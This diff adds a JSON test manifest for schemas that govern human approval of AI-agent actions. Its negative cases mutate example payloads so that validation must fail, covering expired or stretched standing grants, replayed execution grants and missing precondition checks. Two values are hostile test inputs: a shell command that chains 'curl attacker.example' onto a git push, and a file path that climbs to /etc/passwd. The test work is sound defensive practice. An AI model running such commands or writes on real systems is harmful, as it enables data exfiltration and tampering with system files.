@@ -1,0 +1,369 @@
+{
+  "positive": [
+    {
+      "name": "shell.exec reference payload",
+      "schema": "schemas/actions/shell.exec.schema.json",
+      "instance": "examples/actions/shell.exec.json"
+    },
+    {
+      "name": "file.write reference payload",
+      "schema": "schemas/actions/file.write.schema.json",
+      "instance": "examples/actions/file.write.json"
+    },
+    {
+      "name": "policy outcome with its matched rules",
+      "schema": "schemas/approval-policy.schema.json",
+      "instance": "examples/approval-policy-rules.json"
+    },
+    {
+      "name": "dispatch with an execution grant",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/granted-envelope.json",
+      "semantic": true
+    },
+    {
+      "name": "standalone dispatch record with an execution grant",
+      "schema": "schemas/dispatch-record.schema.json",
+      "instance": "examples/granted-dispatch-record.json"
+    },
+    {
+      "name": "file write guarded by a target precondition",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/precondition-envelope.json",
+      "semantic": true
+    },
+    {
+      "name": "file write refused because its target changed after review",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/precondition-failed-envelope.json",
+      "semantic": true
+    },
+    {
+      "name": "auto approval under a human's standing grant",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/standing-grant-envelope.json",
+      "semantic": true
+    },
+    {
+      "name": "standalone auto approval citing a standing grant",
+      "schema": "schemas/approval-record.schema.json",
+      "instance": "examples/standing-grant-approval-record.json"
+    }
+  ],
+  "negative": [
+    {
+      "name": "shell command given as one shell string",
+      "schema": "schemas/actions/shell.exec.schema.json",
+      "instance": "examples/actions/shell.exec.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/command",
+          "value": "git push origin release/2026-04 && curl attacker.example"
+        }
+      ]
+    },
+    {
+      "name": "shell command without its working directory",
+      "schema": "schemas/actions/shell.exec.schema.json",
+      "instance": "examples/actions/shell.exec.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "remove",
+          "path": "/working_directory"
+        }
+      ]
+    },
+    {
+      "name": "shell command with a relative working directory",
+      "schema": "schemas/actions/shell.exec.schema.json",
+      "instance": "examples/actions/shell.exec.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/working_directory",
+          "value": "billing-service"
+        }
+      ]
+    },
+    {
+      "name": "file write that climbs out of its directory",
+      "schema": "schemas/actions/file.write.schema.json",
+      "instance": "examples/actions/file.write.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/path",
+          "value": "/srv/builds/billing-service/../../etc/passwd"
+        }
+      ]
+    },
+    {
+      "name": "file patch that also carries replacement text",
+      "schema": "schemas/actions/file.write.schema.json",
+      "instance": "examples/actions/file.write.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "add",
+          "path": "/content_text",
+          "value": "exports:\n  per_minute: 50\n"
+        }
+      ]
+    },
+    {
+      "name": "review omits the proposed effect hints",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/approval-envelope.json",
+      "expect": "semantic",
+      "expect_error": "changes the effect hints",
+      "operations": [
+        {
+          "op": "remove",
+          "path": "/review_snapshots/0/content/effects"
+        }
+      ]
+    },
+    {
+      "name": "auto approval of an open-world action that needs a human",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/approval-envelope.json",
+      "expect": "semantic",
+      "expect_error": "effects open_world cannot be auto approved",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/request/policy/outcome",
+          "value": "auto_approve"
+        },
+        {
+          "op": "replace",
+          "path": "/request/policy/requirements/allow_auto_approval",
+          "value": true
+        }
+      ]
+    },
+    {
+      "name": "effect hints that are read-only and destructive",
+      "schema": "schemas/proposed-action.schema.json",
+      "instance": "examples/email-reply-approval.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/effects/read_only",
+          "value": true
+        },
+        {
+          "op": "replace",
+          "path": "/effects/destructive",
+          "value": true
+        }
+      ]
+    },
+    {
+      "name": "matched rule effect outside the closed set",
+      "schema": "schemas/approval-policy.schema.json",
+      "instance": "examples/approval-policy-rules.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/matched_rules/0/effect",
+          "value": "allow"
+        }
+      ]
+    },
+    {
+      "name": "unavailable evaluator escalated without the policy opt-in",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/approval-envelope.json",
+      "expect": "semantic",
+      "expect_error": "unavailable evaluator must deny unless policy escalates to a human",
+      "operations": [
+        {
+          "op": "add",
+          "path": "/request/policy/evaluation_status",
+          "value": "evaluator_unavailable"
+        }
+      ]
+    },
+    {
+      "name": "execution grant replayed on another dispatch attempt",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/granted-envelope.json",
+      "expect": "semantic",
+      "expect_error": "execution grant does not bind this dispatch",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/dispatches/0/idempotency_key",
+          "value": "idem_email_ZD-48211_reply_02"
+        }
+      ]
+    },
+    {
+      "name": "invocation without a required execution grant",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/granted-envelope.json",
+      "expect": "semantic",
+      "expect_error": "lacks a required execution grant",
+      "operations": [
+        {
+          "op": "remove",
+          "path": "/dispatches/0/execution_grant"
+        }
+      ]
+    },
+    {
+      "name": "execution grant on a refusal",
+      "schema": "schemas/dispatch-record.schema.json",
+      "instance": "examples/granted-dispatch-record.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/status",
+          "value": "not_dispatched"
+        },
+        {
+          "op": "add",
+          "path": "/reason",
+          "value": "approval_revoked"
+        },
+        {
+          "op": "remove",
+          "path": "/provider"
+        }
+      ]
+    },
+    {
+      "name": "invocation after the target changed",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/precondition-envelope.json",
+      "expect": "semantic",
+      "expect_error": "invoked without a matched target precondition",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/dispatches/0/precondition_check/result",
+          "value": "changed"
+        }
+      ]
+    },
+    {
+      "name": "invocation without checking the target precondition",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/precondition-envelope.json",
+      "expect": "semantic",
+      "expect_error": "invoked without a matched target precondition",
+      "operations": [
+        {
+          "op": "remove",
+          "path": "/dispatches/0/precondition_check"
+        }
+      ]
+    },
+    {
+      "name": "review hides the target precondition",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/precondition-envelope.json",
+      "expect": "semantic",
+      "expect_error": "changes the target precondition",
+      "operations": [
+        {
+          "op": "remove",
+          "path": "/review_snapshots/0/content/target_precondition"
+        }
+      ]
+    },
+    {
+      "name": "standing grant used after it expired",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/standing-grant-envelope.json",
+      "expect": "semantic",
+      "expect_error": "standing grant was not in force when it was used",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/approvals/0/standing_grant/expires_at",
+          "value": "2026-04-28T09:00:00Z"
+        }
+      ]
+    },
+    {
+      "name": "standing grant stretched to another action type",
+      "schema": "schemas/approval-envelope.schema.json",
+      "instance": "examples/standing-grant-envelope.json",
+      "expect": "semantic",
+      "expect_error": "standing grant does not cover email.send",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/approvals/0/standing_grant/scope/action_types",
+          "value": [
+            "ticket.create"
+          ]
+        }
+      ]
+    },
+    {
+      "name": "standing grant issued by a policy instead of a human",
+      "schema": "schemas/approval-record.schema.json",
+      "instance": "examples/standing-grant-approval-record.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "replace",
+          "path": "/standing_grant/granted_by/kind",
+          "value": "policy"
+        }
+      ]
+    },
+    {
+      "name": "standing grant cited by a human decision",
+      "schema": "schemas/approval-record.schema.json",
+      "instance": "examples/email-reply-approval-record.json",
+      "expect": "schema",
+      "operations": [
+        {
+          "op": "add",
+          "path": "/standing_grant",
+          "value": {
+            "grant_id": "grant_2026-04-27_support-replies",
+            "granted_by": {
+              "kind": "human",
+              "identifier": "rene@acme-corp.example",
+              "display_name": "Rene Z.",
+              "roles": [
+                "customer-support"
+              ],
+              "authentication": {
+                "method": "signed_callback",
+                "human_present": true,
+                "assurance": "substantial",
+                "authenticated_at": "2026-04-28T09:14:30Z",
+                "evidence_ref": "mail-callback:mail_2026-04-28_3391"
+              }
+            },
+            "granted_at": "2026-04-27T16:02:00Z",
+            "expires_at": "2026-05-04T16:02:00Z",
+            "scope": {
+              "tenant": "acme-corp",
+              "action_types": [
+                "email.send"
+              ],
+              "max_risk": "medium"
+            },
+            "max_uses": 200,
+            "use_number": 14
+          }
+        }
+      ]
+    }
+  ]
+}
